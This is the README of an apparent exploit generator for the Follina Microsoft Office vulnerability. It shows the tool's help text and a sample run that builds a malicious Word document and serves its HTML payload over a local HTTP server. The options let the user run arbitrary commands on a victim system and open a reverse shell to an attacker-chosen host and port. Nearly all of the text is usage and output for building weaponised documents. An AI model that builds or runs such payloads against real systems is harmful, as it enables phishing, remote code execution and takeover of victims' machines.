# Follina Exploit

Convert a Microsoft Windows Doc into a One-Click Payload

## Usage
```bash
$ ./follina_exploit.py --help
usage: follina_exploit.py [-h] [-f FILE] [-c COMMAND] [-o OUTPUT] [-i IP] [-p PORT] [-r LHOST:LPORT]

[+] Exploit Generator for Follina

options:
  -h, --help            show this help message and exit
  -f FILE, --file FILE  Input Microsoft Word File
  -c COMMAND, --command COMMAND
                        Command to execute on the remote system [Default: Calc]
  -o OUTPUT, --output OUTPUT
                        Name of output malicious Doc [Default: exploit.doc]
  -i IP, --ip IP        Interface to bind http server to [Default: 127.0.0.1]
  -p PORT, --port PORT  Port to start http server on [Default: 6969]
  -r LHOST:LPORT, --reverse LHOST:LPORT
                        IP and Port for reverse shell
```

```bash
$ ./follina_exploit.py
⚙ Input File: whokilleddb.docx
⚙ Output File: exploit.doc
⚙ Starting HTTP Server over: 127.0.0.1:6969
⚙ Command: calc.exe
📁 Staging Folder: /tmp/follina_fu9t5t6p
🐞 Wrote payload to /tmp/follina_fu9t5t6p/www/index.html
🔥 Preparing Malicious doc
🌐 Serving /tmp/follina_fu9t5t6p/www over http://127.0.0.1:6969
✔ Created Malicios Doc: /home/whokilleddb/Code/Follina/exploit.doc
```

## To-Do

- Change the document to RTF form

## References

- https://doublepulsar.com/follina-a-microsoft-office-code-execution-vulnerability-1a47fce5629e
- https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/inject-macros-from-a-remote-dotm-template-docx-with-macros
